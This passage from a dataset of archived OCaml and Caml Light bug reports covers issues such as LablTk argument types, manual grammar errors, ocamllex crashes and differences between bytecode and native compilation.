= 3\n  method get_my_n ()= n\nend\n\nlet y = new foobar;;\nlet x = y#get_n ();;\nlet z = y#get_my_n ();;\n\n-----------------------\nthe output is the following:\nInitialization, pass 1\nInitialization, pass 1\n# val x : int = 2\n# val z : int = 3\n\nIt seems like\ninitializer is called twice, and each call uses a different instance variable\n'n', whose initial value is 1 and which gets incremented (get_n returns 2).\nMoreover, while get_n uses the same instance variable as one of the two\ninitializer, get_my_n uses the correct value, '3' which neither of the\ninitializer call seems to take into account.\n-- \nE tutto per oggi, a la prossima volta\nVirgile\n"},{"labels":["bug"],"text":"**Original bug ID:** 1581\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Matt Gushee\nVersion: 3.06\nOS: Linux (Debian 3.0)\nSubmission from: 216.241.35.41 (216.241.35.41)\n\n\nLablTk specifies a type of float for the 'weight' argument to\nGrid.column_configure\nand Grid.row_configure, but Tk expects an integer. Therefore,\n\n  Grid.column_configure ... ~weight: 1.;\n\nresults in the following error:\n\n  Exception: Protocol.TkError \"expected integer but got \\\"1.\\\"\".\n\nSample code is included at the bottom of this message.\n\nThis bug can be fixed by editing $OCAML_SRC/otherlibs/labltk/Widgets.src as\nfollows:\n\n  subtype option(rowcolumnconfigure) {\n    Minsize [\"-minsize\"; Units/int]\n    Weight  [\"-weight\"; float]   ->   Weight [\"-weight\"; int]  (* line 847 *)\n    Pad [\"-pad\"; Units/int]       \n  }\n\n(* ==================================================== *)\n(* Sample code *)\nopen Tk;;\n\nlet win = openTk () in\n  let f = Frame.create win in\n  let main = Text.create f in\n  let v = Scrollbar.create f ~orient: `Vertical ~command: (Text.yview main)\n  and h = Scrollbar.create f ~orient: `Horizontal ~command: (Text.xview main)\nin\n  Text.configure main ~yscrollcommand: (Scrollbar.set v) \n    ~xscrollcommand: (Scrollbar.set h);\n  pack [ f ] ~expand: true ~fill: `Both;\n  grid [ main ] ~row: 0 ~column: 0 ~sticky: \"nsew\";\n  grid [ v ] ~row: 0 ~column: 1 ~sticky: \"ns\";\n  grid [ h ] ~row: 1 ~column: 0 ~sticky: \"ew\";\n\n  (* ================================================== *)\n  (* == Exception raised here ========================= *)\n  Grid.column_configure f 0 ~weight: 1.;\n  Grid.row_configure f 0 ~weight: 1.;\n  (* ================================================== *)\n\n  mainLoop ()\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1580\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\n<html><div style='background-color:'><DIV>\n<P><BR><BR></P>\n<DIV>\n<DIV></DIV>\n<P><BR><BR></P>Bonjour, </DIV></DIV>\n<DIV></DIV>\n<DIV></DIV>\n<P>je suis Ã©tudiant en sup maths, et je me sers de caml-light pour mes cours d'informatique.</P>\n<DIV></DIV>\n<P>Malheureusement, j'ai essayÃ© de l'installer sous windows95, mais la police de caractÃ¨re est trop dÃ©formÃ©e et je ne peux pas me servir de caml-light.</P>\n<DIV></DIV>\n<P>J'ai pourtant essayer de nombreuses polices en modifiant le fichier caml.ini, sans aucun rÃ©sultat. Je peux en revanche modifier la taille des caractÃ¨res sans problÃ¨me, mais pas la police.</P>\n<DIV></DIV>\n<P>Que faire ? Faut il utiliser une certaine police prÃ©cise ?<BR>M'y suis-je mal pris pour changer de police (comment faire) ?</P>\n<DIV></DIV>\n<P>Merci de m'aider</P>\n<DIV></DIV>\n<P>RÃ©mi Fayolle</P>\n<DIV></DIV></div><br clear=all><hr>Pro ou perso, toutes les adresses et numÃ©ros de tÃ©l que vous cherchez <a href=\"http://g.msn.com/8HMZFRFR/2743\">Cliquez-ici </a> </html>\n"},{"labels":["bug"],"text":"**Original bug ID:** 1577\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Kun Gao\nVersion: 3.06\nOS: Linux\nSubmission from: adsl-66-127-57-108.dsl.snfc21.pacbell.net (66.127.57.108)\n\n\nCalling Text.image_create ~image:some_filename will always report filename as\nbad\n"},{"labels":["bug"],"text":"**Original bug ID:** 1575\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Kun Gao\nVersion: 3.06\nOS: Linux\nSubmission from: adsl-66-127-57-108.dsl.snfc21.pacbell.net (66.127.57.108)\n\n\nLabltk does not propogate exceptions. Any exceptions raised inside of Tk code\ndoes not get propogated outside of Tk...\n\nFor example:\n\nlet top = openTk () \n...\n...\nraise Some_exception;\n...\n...\nPrintexc.print mainLoop();\n\nThe exception will not be caught by the last line...\n"},{"labels":["bug"],"text":"**Original bug ID:** 1574\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI'm not sure whether this is a bug or a feature.\n\nI need to save the state of the Xcaml session between CGI \nexecutions. Thinking in terms of Jserv-compliant \nimplementation, i used a Weak.Make(...).t hashtable to store \n  session data, so that old and no longer used data might be \nautomatically reclaimed by the GC. However, I found that \nthis implementation is buggy, because when I marshal and \nunmarshal the weak hashtable, I always get an empty \nhashtable back. Why is this?\n\nI made a switch to Hashtbl.Make(...).t and now the session \nhandling in Xcaml works fine, except that there is no \nautomatic garbage collection. All other code, except for \nminor modifications due to incompatibilities between the \noutput signatures of Hashtbl.Make and Weak.Make, has been \nleft untouched.\n\nOne more remark concerning the Weak.Make functor. Why in the \nworld are Hashtbl.Make and Weak.Make incompatible? It is \nonly natural to think of the second as a particularly clever \nimplementation of the first. Besides, the two modules are so \nsimilar that really deserve to have the same signatures. I \nstrongly encourage the Caml Masters to think this over. Of \ncourse, I could reimplement the Weak.Make functor in a Weak2 \nmodule for the ocamllib-addons package, but is it worth it?\n\nAlex\n"},{"labels":["bug"],"text":"**Original bug ID:** 1573\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe ocaml parser accepts the expression\n\n   let x = Pervasives.(+);;\n\nbut if I follow through the grammar in the manual, it says it\nshouldn't.  The problem is that according to the manual,\n\"Pervasives.(+)\" isn't a value-path.\n\nThe expression is obviously meaningful and useful, so I think the\nerror is in the manual.  The production for value-path at\nhttp://caml.inria.fr/ocaml/htmlman/manual011.html reads:\n\n   value-path ::= value-name\n                | module-path . lowercase-ident\n\nand I think it should read\n\n   value-path ::= value-name\n                | module-path . value-name\n\nThe value-name production admits lowercase identifiers or\nparenthesized operators like \"(+)\".\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1570\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: JÃ©rÃ´me Kasparian\nVersion: ocaml 3.06\nOS: MacOS X and Mandrake 8.1\nSubmission from: maclasim13.univ-lyon1.fr (134.214.98.65)\n\n\nHello,\n\nIt seems that an undocumented (refering to the ocaml 3.06 manual, pages 164-165)\nincompatibility between bytecode and native compilation concerns the trapping of\nInvalid_arguments exceptions.\nThe sample code below runs well under bytecode compilation and generates a bus\nerror when native compiled with ocamlopt.\nThis is true on MacOS X as well as on Linux Mandrake 8.1\n\nHope it helps !\n\nJÃ©rÃ´me Kasparian\n\n(* Sample code *)\n\nlet a = Array.make 4 4;;\ntry a.(-4)\nwith (Invalid_argument \"Array.get\") -> 0\n;;\n\n(* end of sample code *)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1569\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nFull_Name: James Matter\nVersion: CamlLight V0.74 for Windows\nOS: Windows XP\nSubmission from: avenue.plus.com (212.159.5.49)\n\n\nInstaller will not run under windows XP. Error is 'INSTW caused a General\nProtection Fault in module CAMLL~1.EXE at 0001:0BD6. Choose close. INSTW will\nclose.' with a single button, 'Close'. This error occurs every time the\ninstaller is run. If I try to run the executable (installed previously under\nWindows 98), I get an error 'No bytecode file specified' and the program\ncloses.\n\nAny help would be appreciated - I know that if you try to run an executable from\na previous install of windows even when under Windows 98, you get the same 'No\nbytecode file specified' error - is it possible to manually specify the bytecode\nfile and how would I go about doing this?\n\n-JJ\n"},{"labels":["bug"],"text":"**Original bug ID:** 1568\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThat's right. I fix it.\nThanks for the report.\n\n       Jacques Garrigue\n\nFrom: tim@fungible.com\n> In the grammar for typexpr at \n> \n>    http://caml.inria.fr/ocaml/htmlman/manual012.html\n> \n> the fourth production says that a typexpr can be\n> \n>    [[?] ident:] typexpr -> typexpr\n> \n> I think this should read\n> \n>    [[?] label-name:] typexpr -> typexpr\n"},{"labels":["bug"],"text":"**Original bug ID:** 1567\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn the grammar for typexpr at \n\n   http://caml.inria.fr/ocaml/htmlman/manual012.html\n\nthe fourth production says that a typexpr can be\n\n   [[?] ident:] typexpr -> typexpr\n\nI think this should read\n\n   [[?] label-name:] typexpr -> typexpr\n\n-- \nTim Freeman       \ntim@fungible.com\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1564\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn the grammar for \"expr\" at\nhttp://caml.inria.fr/ocaml/htmlman/manual015.html, the production for\nsetting the value of an instance variable is missing.\n\nIt is mentioned in passing in the \"Method definition\" section of\n.../manual017.html, but I think that was meant to be a restatement of\nproductions already present in expr, not an addition of new\nproductions.  For example, the copy-with-instance-variable-assignment\nexpression (such as <x = 3; y = \"x\">) is also mentioned in the \"Method\ndefinition\" section, and that does appear in the definition of \"expr\".\n\n-- \nTim Freeman       \ntim@fungible.com\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1563\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: eric fillatre\nVersion: ocaml version 3.06\nOS: windows 2000\nSubmission from: curie.noos.net (212.198.0.93)\n\n\nModule signature depends of order of definitions \n\nI define a Foo module\n\nmodule Foo =\n  struct\n    type 'a t = {min : 'a ; max : 'a}\n\n    let merge i j =\n      let min = (if i.min < j.min then i.min else j.min) in\n      let max = (if i.max > j.max then i.max else j.max) in\n      {min = min ; max = max}\n\n    let (<) i j = (i.max < j.min) \n    let (>) i j = (i.min > j.max)       \n  end\n\nif i load it in the ocaml interpreter, i obtain the following signature :\n\nmodule Foo :\n  sig\n    type 'a t = { min : 'a; max : 'a; } \n    val merge : 'a t -> 'a t -> 'a t\n    val ( < ) : 'a t -> 'a t -> bool\n    val ( > ) : 'a t -> 'a t -> bool\n  end\n\nif now i change the order of definitions :\n\nmodule Foo =\n  struct\n    type 'a t = {min : 'a ; max : 'a}\n\n    let (<) i j = (i.max < j.min) \n    let (>) i j = (i.min > j.max)       \n\n    let merge i j =\n      let min = (if i.min < j.min then i.min else j.min) in\n      let max = (if i.max > j.max then i.max else j.max) in\n      {min = min ; max = max}\n  end\n\nif i load it in the ocaml interpreter, i obtain a different signature (see\nmerge) :\n\nmodule Foo :\n  sig\n    type 'a t = { min : 'a; max : 'a; } \n    val ( < ) : 'a t -> 'a t -> bool\n    val ( > ) : 'a t -> 'a t -> bool\n    val merge : 'a t t -> 'a t t -> 'a t t\n  end\n"},{"labels":["bug"],"text":"**Original bug ID:** 1560\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: chris quinn\nVersion: 3.06\nOS: \nSubmission from: 212.42.169.63 (212.42.169.63)\n\n\nhello.\n\nocamlc -i on input of\nlet x = 1\nlet x = 1\ngives types of both!\n"},{"labels":["bug"],"text":"**Original bug ID:** 1559\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Laurent Vibert\nVersion: 3.06\nOS: \nSubmission from: cafe.irisa.fr (131.254.22.19)\n\n\nBonjour,\n\nQuand une variable est contrainte, je ne vois aucun moyen de la rendre\npolymorphe :\n\nclass type o = object end\nclass ['a] c = object constraint 'a = #o end\n\nclass type c2 = object method m : 'a. 'a c end;;\n(* This type 'a should be an instance of type #o as 'b = < .. > *)\n\nclass type c2 = object method m : 'a. (_ c) as 'a end;;\n(* This type has no row variable *)\n\nclass type c2 = object method m : 'a. (#o as 'a) c end;;\n(* This type #o should be an instance of type #o as 'a = < .. >\nThe universal variable 'b would escape its scope *)\n\npar contre, ceci marche parfaitement , mais ce n'est pas ce qu'on voulait :\nclass type c2 = object method m : 'a. (_ #c) as 'a end;;\n"},{"labels":["bug"],"text":"**Original bug ID:** 1558\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Alex Baretta\nVersion: 3.06\nOS: Linux\nSubmission from: host108-4.pool62211.interbusiness.it (62.211.4.108)\n\n\nlet bs_regexp = \"\\\\\\\\\\\\\\\\\" (* Matches two BS in a row *)\nlet bs_escape_tmpl = \"\\\\\" (* We want to replace matching substrings\n                             with one single BS*)\n\nlet text = \"...<text with backslash escapes>...\"\n\nlet parsed_text = Str.global_replace bs_regexp bs_escape_tmpl text;;\n\n---> Exception: Failure \"Str.replace: illegal backslash sequence\".\n\nIf I change the bs_escape_tmpl to \"\\\\\\\\\" I no longer get an exception, but\nneither are my double-BS replaced by single BS--the \"\\\\\\\\\" template and the\n\"\\\\\\\\\\\\\\\\\" regexp perform mutually trasformations on text.\n\nLet me know...\n\nAlex\n"},{"labels":["bug"],"text":"**Original bug ID:** 1557\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: mattias waldau\nVersion: 3.06\nOS: NT4\nSubmission from: h199n1fls34o849.telia.com (213.67.121.199)\n\n\nI had to set\n\nCAMLP4LIB='C:\\ocaml\\lib\\camlp4'\n\nin order to make camlp4 find pa_extend.cmo\n"},{"labels":["bug"],"text":"**Original bug ID:** 1555\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Hugo Herbelin\nVersion: 3.06\nOS: linux\nSubmission from: herbelin.net1.nerim.net (62.212.105.93)\n\n\n\n  Bonjour,\n\n  I fell on a funny behaviour of ast-based preprocessing wrt to useless pattern\ndetection. \n\n  When preprocessed with camlp4o the following program reports an incorrect\nuseless pattern.\n\n% cat foo.ml\nlet f = function\n  | 'b' -> 1\n  | 'a'..'c' -> 2\n  | _ -> 3\n% ocamlc -pp 'camlp4o' -c -impl ~/foo.ml\nFile \"/home/herbelin/toto.ml\", line 3, characters 4-12:\nWarning: this pattern is unused.\n\n  When communicating via ocaml parser, it is correct though (no warning).\n\n% ocamlc -pp 'camlp4o pr_o.cmo' -c -impl ~/foo.ml\n\n  In both cases, the .cmo is the same, so it really just seems to be that the\nuseless pattern detection is not happy with the abstract syntax tree returned by\ncamlp4 (perhaps is 'a'..'c' then expanded) ?\n\n  Thanks for all.\n\n  Hugo\n"},{"labels":["bug"],"text":"**Original bug ID:** 1554\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe shell dialogue below shows that there is an input file that\ncrashes ocamllex.  The ocamllex version in question was built from\nfresh CVS sources this morning.  \n\nThe shell dialogue also shows that in this case, ocamllex crashes when\nit tries to compute a stack trace.\n\nThen we go on to try ocamllex from the ocaml 3.06 distribution.  It\nworks fine.\n\nThen we show that the same problem was present with a version built\nfrom November 2002 CVS sources, but a stack trace can be produced.  I\nwrote down some thoughts about the stack trace after the shell dialogue.\n\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs> printenv OCAMLRUNPARAM\n   -b\n   >>>Current CVS fails.<<<\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs/lex> ./ocamllex ~/s/conscious/ocaml/lex.mll\n   Fatal error: exception Invalid_argument(\"Array.get\")   >>>Bad.<<<\n   Segmentation fault   >>>Crashing when computing a stack trace.  Bad.<<<\n   >>>Here's the input file that breaks it.<<<\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs/lex> cat ~/s/conscious/ocaml/lex.mll\n   {\n    module L = Lexeme\n    module S = Stream\n   }\n   (* eager_lexemes lexbuf returns an eager stream of lexemes. *)\n   rule eager_lexemes = parse\n     '(' { S.icons L.LPAREN (lexemes lexbuf) }\n   | eof { S.sempty }\n   (* lexemes lexbuf returns a lazy stream of lexemes. *)\n   and lexemes = parse\n     (* empty *) { S.slazy (fun () -> eager_lexemes lexbuf) }\n   >>>This file works fine with ocamllex from 3.06 from Debian.<<<\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs/lex> /usr/bin/ocamllex ~/s/conscious/ocaml/lex.mll\n   4 states, 257 transitions, table size 1052 bytes\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs/lex> dpkg -S ocamllex\n   ocaml: /usr/bin/ocamllex\n   ocaml: /usr/share/man/man1/ocamllex.1.gz\n   ocaml: /usr/share/man/man1/ocamllex.opt.1.gz\n   ocaml: /usr/lib/ocaml/3.06/camlp4/pa_ocamllex.cma\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs/lex> dpkg -l ocaml\n   Desired=Unknown/Install/Remove/Purge/Hold\n   | Status=Not/Installed/Config-files/Unpacked/Failed-config/Half-installed\n   |/ Err?=(none)/Hold/Reinst-required/X=both-problems (Status,Err: uppercase=bad)\n   ||/ Name           Version        Description\n   +++-==============-==============-============================================\n   ii  ocaml          3.06-15        ML language implementation with a class-base\n   >>>The November 2002 version fails the same way as the current CVS,\n      except you get a good stacktrace.<<<\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs> ~/s/lex/ocamllex ~/s/conscious/ocaml/lex.mll\n   Fatal error: exception Invalid_argument(\"Array.get\")\n   Raised from a C function\n   Called from file \"lexgen.ml\", line 1071, character 38\n   Called from file \"lexgen.ml\", line 947, character 18\n   Called from file \"lexgen.ml\", line 1151, character 67\n   Called from file \"list.ml\", line 57, character 23\n   Called from file \"list.ml\", line 57, character 39\n   Called from file \"lexgen.ml\", line 1158, character 16\n   Called from file \"main.ml\", line 53, character 65\n   Re-raised at file \"main.ml\", line 96, character 17\n   Called from file \"main.ml\", line 100, character 36\n   lobus:/huge/tim/unhacked-ocaml-anon-cvs> \n\nHere are some lines from my copy of the November, 2002 version of\nlexgen.ml, with a \"^\" inserted below character 38 of line 1071:\n\nlet translate_state shortest_match tags chars follow st =\n  let (n,(_,m)) = st.final in\n  if MemMap.empty = st.others then\n    Perform (n,do_tag_actions n tags m)\n                                      ^\n  else if shortest_match then begin\n    if n=no_action then\n      Shift (No_remember,reachs chars follow st.others)\n    else\n      Perform(n, do_tag_actions n tags m)\n  end else begin\n    Shift (\n    (if n = no_action then\n      No_remember\n    else\n      Remember (n,do_tag_actions n tags m)),\n    reachs chars follow st.others)\n  end\n\nOne hypothesis is that the stack trace is garbage, since it's\ncomplaining that Array.get is returning an out-of-bounds result but it\ngives a pointer to a place that is not a call to Array.get.  \n\nAnother hypothesis is that the problem happened in the array reference\nto env.(n) at the end of do_tag_actions, and the compiler decided to\ninline do_tag_actions, and the code that generates stack traces isn't\nkind enough to insert stack frames for inlined subroutines.\n\nThe problem may have been caused by me putting an empty regexp in the\nlex.mll file.  This is a sensible thing to do, but the documentation\nfor ocamllex says it is illegal.  Nevertheless it should not crash\nocamllex.\n\n-- \nTim Freeman       \ntim@fungible.com\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1553\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nAt http://caml.inria.fr/ocaml/htmlman/manual009.html, under \"Keywords\", the\nkeyword \"??\" is listed.\n\nSo far as I can tell, this keyword appears nowhere in the grammar and\nis not a possible output from the lexer.\n\nAlso, this keyword also matches the lexical syntax for prefix-symbol\nas described in \"Prefix and infix symbols\", so having \"??\" as a\nkeyword makes the lexical grammar ambiguous.\n\nTherefore, I think the document is in error and does not describe the\nimplemented language.  I can't figure out what was intended, though.\n-- \nTim Freeman       \ntim@fungible.com\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1552\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello, I was using 'as' patterns and found behavior that seemed strange.\n\n\n--\n  let ((a,b) as x ,(c,d) as y) as z = ((1,2),(3,4))\n  in\n    ((a,b,c,d),(x,y,z));;\n--\n\nI'd expect x == (a,b) and y == (c,d), but I don't get that, I get \ny == ((a,b),(c,d))\n\n\nInvoke this and see what I mean:\n--\n  let ((a,b) as x ,(c,d) as y) as z = ((1,2),(3,4))\n  in\n    y;;\n\n- : (int * int) * (int * int) = (1, 2), (3, 4)\n--\n\nShouldn't it give me (3,4)?\n\n\nHowever, if I insert an extra set of paremthesis, it works:\n--\n  let ((a,b) as x ,((c,d) as y)) as z = ((1,2),(3,4))\n  in\n    y;;\n\n- : int * int = 3, 4\n--\n\nSo is this a bug?\n\nScott\n"},{"labels":["bug"],"text":"**Original bug ID:** 1551\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nComme j'avais un programme lablgtk qui plantait betement en mode debug\n(C et Caml) alors qu'il marchait sans probleme en compilation normal,\nje me suis amuse' a` le faire tourner avec libcamlrund.\n\nResultat: il y a un assertion manquee sur MAKEBLOCK, avec trop\nd'arguments. Je ne sais pas si c'est la cause, mais c'est clairement\ndangereux, non?\nEn cherchant l'origine, il semble s'agire de la traduction du module\nGdkKeysyms de lablgtk, qui contient 1320 valeurs. Mais il semble bien\nqu'il n'y absolument aucun test sur Pmakeblock dans le compilateur,\ndonc le meme probleme peut se produire avec un tuple ou un\nenregistrement (genere', bien sur).\n\nAmicalement,\n\n        Jacques\n"},{"labels":["bug"],"text":"**Original bug ID:** 1549\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Emmanuel Renieris\nVersion: 3.06\nOS: Linux\nSubmission from: miette.cs.brown.edu (128.148.38.66)\n\n\nmiette /u/er -> ocaml\n        Objective Caml version 3.06\n\n# let rec f x = g x and g x = if x = 0 then 0 else f (x-1);;\nval f : int -> int = <fun>\nval g : int -> int = <fun>\n# #trace f;;\nf is now traced.\n# #trace g;;\ng is not a function.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1548\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nAll right, it was an RTFM issue. Sorry to bother. This works:\n\ntype ('a, 'b) fn = 'a -> 'b\n\nexternal (@@) : ('a, 'b) fn -> ('a, 'b) fn = \"%identity\"\n\nlet x = sin @@ 1.0\n\nA bit kludgy in my opinion (type definitions don't define _synonyms_)\nbut I guess I can live with that.\n\n\nLauri Alanko\nla@iki.fi\n"},{"labels":["bug"],"text":"**Original bug ID:** 1547\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe program:\n\nexternal (@@) : ('a -> 'b) -> 'a -> 'b = \"%identity\"\nlet x = sin @@ 1.0\n\nkills ocaml and ocamlc with:\n\n>> Fatal error: Bytegen.comp_primitive\nFatal error: exception Misc.Fatal_error\n\nand ocamlopt with:\n\n>> Fatal error: Cmmgen.transl_prim_2\nFatal error: exception Misc.Fatal_error\n\nIf the type of (@@) is changed to 'a -> 'a, then everything works fine.\n\nThe idea, obviously, is to mimic Haskell's $-operator, and I want it to\nhave the right type.\n\nI'm using ocaml 3.06, specifically Debian's ocaml_3.06-15_i386.deb.\n\n\nLauri Alanko\nla@iki.fi\n"},{"labels":["bug"],"text":"**Original bug ID:** 1546\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: erwan jahier\nVersion: 3.06\nOS: linux\nSubmission from: ossau.imag.fr (129.88.43.4)\n\n\n\nlet _ =\n  print_int (int_of_float (4.1 *. 10.)) ;\n  print_string \"\\n\";\n  flush stdout\n  \nThis chunck of code prints 40 if compiled with ocamlopt and 41. with ocamlc...\n\n\n\n> uname -a\nLinux ecrins 2.4.20-verimag #1 SMP Fri Jan 24 10:16:46 CET 2003 i686 unknown\n\n> ocamlopt -v\nThe Objective Caml native-code compiler, version 3.06\nStandard library directory: /home/jahier/lib/ocaml\n\n> ocamlopt bug.ml -o bug-nc\n> ./bug-nc\n40\n\n> ocamlc bug.ml -o bug-bc\n>./bug-bc\n\n41\n"},{"labels":["bug"],"text":"**Original bug ID:** 1545\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nsur pc sous  netbsd 1.6\ncompilateur gcc 2.95.3 \ncompilation de ocaml 3.06\nmessage d'erreur au lancement  d'ocaml\nFatal error: unknown C primitive 'gc_major_slice'\nque faire ??\n"},{"labels":["bug"],"text":"**Original bug ID:** 1543\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Samuel LeliÃ¨vre\nVersion: cl75\nOS: Mac OS X 10.2.3\nSubmission from: iml68.univ-mrs.fr (139.124.6.68)\n\n\nI downloaded caml light and the macosx patch, but couldn't patch.\nBelow is the type of message I got.\n\n\n[machine:/Applications/cl75] samuel% patch -p0 < caml-light-macosx-1.patch\ncan't find file to patch at input line 8\nPerhaps you used the wrong -p or --strip option?\nThe text leading up to this was:\n--------------------------\n|Index: contrib/Makefile\n|===================================================================\n|RCS file: /net/pauillac/caml/repository/camllight/sources/contrib/Makefile,v\n|retrieving revision 1.28\n|diff -c -r1.28 Makefile\n|*** Makefile   2002/02/11 08:33:24     1.28\n|--- Makefile   2002/10/02 13:45:12\n--------------------------\nFile to patch:\n"},{"labels":["bug"],"text":"**Original bug ID:** 1542\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Rabih El Chaar\nVersion: 3.06\nOS: Winnt\nSubmission from: hades.sgam.com (194.119.92.65)\n\n\nThere is some information missing in the CAML documentation related to\ninterfacing CAML with C.\nThe description of the function copy_string_array in chapter 18.4.4 is the\nfollowing :\n\ncopy_string_array(p) allocates an array of strings, copied from the pointer to a\nstring array p (a char **). \n\nyou should add a mention indicating that the array p is null terminated (needed\nto find out the number of strings in the array).\n\nthe description should be :\n\ncopy_string_array(p) allocates an array of strings, copied from the pointer to a\nstring array p (a char **), null terminated.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1541\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI want to tell you that there is a problem of compatibility between \nocaml 3.06 and\ntcl/tk 8.4.1. indeed when i tried to install ocaml i got an error of \ncompilation in make world\nsaying that the call of Tk_PhotoPutBlock in \notherlibs/labltk/support/cltkImg.c had two few arguments\nit is due to an evolution of tk in the number of arguments in the \nprocedure (cf 